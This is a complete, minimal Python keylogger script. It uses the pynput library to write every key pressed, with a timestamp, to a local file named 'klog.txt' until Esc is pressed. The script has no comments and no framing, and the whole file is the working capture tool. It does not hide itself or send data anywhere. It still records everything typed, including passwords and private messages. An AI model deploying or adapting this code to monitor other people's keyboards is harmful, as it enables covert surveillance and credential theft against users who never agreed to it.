#!/usr/bin/env python3

from pynput import keyboard
from datetime import datetime

def on_press(key):
    with open('klog.txt', 'a') as f:
        try:
            f.write(f'at: {datetime.now()} pressed: {key.char}\n')
        except AttributeError:
            f.write(f'at: {datetime.now()} pressed: {key}\n')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(
    on_press= on_press, 
    on_release= on_release) as listener:
    listener.join()
